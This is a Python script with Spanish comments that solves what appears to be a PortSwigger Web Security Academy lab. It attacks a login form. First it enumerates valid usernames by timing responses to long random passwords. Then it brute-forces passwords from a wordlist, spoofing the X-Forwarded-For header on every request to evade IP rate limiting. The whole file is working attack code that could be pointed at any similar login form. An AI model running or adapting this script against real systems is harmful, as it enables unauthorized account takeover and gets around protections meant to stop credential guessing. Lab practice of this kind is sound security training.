import requests, signal, sys, string, random

def read_file(file):
    content = []

    f = open(file, "r")
    while(True):
        linea = f.readline().rstrip('\n')
        content.append(linea)
        if not linea:
            break
    f.close()

    del content[-1]
    return content

def valid_username(url, usernames):

    valid_usernames = []

    for username in usernames:
        headers = {'X-Forwarded-For':str(int(usernames.index(username)+.0)+1)}
        password = ''.join(random.choice(string.ascii_letters) for i in range(random.randint(120,150)))
        data = {"username":username,"password":password}

        response_user = requests.post(url=url, data=data, headers=headers)
        #print("Usuario: {}\t\tTiempo {}".format(username, response_user.elapsed.total_seconds()))

        #Se observo que una peticion se exedia del rango promedio 0.5 a 0.65.
        if int(response_user.elapsed.total_seconds()) >= 1:
            valid_usernames.append(username)
        else:
            pass

    print("\nLos usuarios validos son: {}".format(','.join(valid_usernames)))
    return valid_usernames

def valid_password(url, valid_usernames, passwords):

    valid_password = dict.fromkeys(valid_usernames, '')

    for username in valid_usernames:
        for password in passwords:
            headers = {'X-Forwarded-For':str(int(passwords.index(password)+.0)+1)}
            data = {"username":username,"password":password}
            
            response_pass = requests.post(url=url, data=data, headers=headers, allow_redirects=False)
            #print("Validando password: {}\t\tUsuario: {}\t\tCodigo de estado:{}".format(password,username,response_pass.status_code))

            if response_pass.status_code == 200:
                pass
            else:
                valid_password[username] = password

    return valid_password

def def_handler(key,frame):
    print("\n[*] Saliendo")
    sys.exit(1)

def pretty(valid_passwords):
    for key, value in valid_passwords.items():
        print("\n[*] {}:{}".format(key,value))

def main():

    signal.signal(signal.SIGINT, def_handler)

    url = "https://ac051f621e4f3a98808be13e00bd0048.web-security-academy.net/login"

    print("\n[*] Validando username\n")
    usernames = read_file("usernames")
    valid_usernames = valid_username(url, usernames)

    print("\n[*] Validando password\n")
    passwords = read_file("passwords")
    valid_passwords = valid_password(url, valid_usernames, passwords)

    pretty(valid_passwords)

if __name__ == "__main__":
    main()